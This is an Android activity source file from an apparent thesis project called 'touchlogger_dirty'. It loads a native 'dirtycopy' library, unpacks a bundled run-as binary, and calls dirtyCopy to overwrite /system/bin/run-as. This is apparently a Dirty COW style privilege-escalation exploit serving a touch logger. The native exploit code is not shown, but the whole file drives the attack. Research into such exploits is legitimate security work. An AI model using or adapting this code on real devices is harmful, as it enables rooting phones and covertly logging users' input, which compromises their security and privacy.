package org.leyfer.thesis.touchlogger_dirty.activity;

import android.app.Activity;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import org.leyfer.thesis.touchlogger_dirty.R;

import java.io.File;

import static org.leyfer.thesis.touchlogger_dirty.utils.FileUtils.unpackAsset;

public class MainActivity extends Activity {

    static {
        System.loadLibrary("dirtycopy");
    }

    public static final String TAG = "TouchLoggeer-dirty";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Example of a call to a native method
        TextView tv = (TextView) findViewById(R.id.sample_text);
        tv.setText(stringFromJNI());

        Button button = (Button) findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        String abi;
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                            abi = Build.SUPPORTED_ABIS[0];
                        } else {
                            abi = Build.CPU_ABI;
                        }

                        File runAsPath = unpackAsset(MainActivity.this, String.format("%s/run-as", abi), "run-as");
                        if (runAsPath != null) {
                            dirtyCopy(runAsPath.getAbsolutePath(), "/system/bin/run-as");
                        }

                        Log.d(TAG, "Copy finished!");
                    }
                }).start();
            }
        });
    }

    /**
     * A native method that is implemented by the 'native-lib' native library,
     * which is packaged with this application.
     */
    public native String stringFromJNI();

    public static native void dirtyCopy(String srcPath, String dstPath);
}
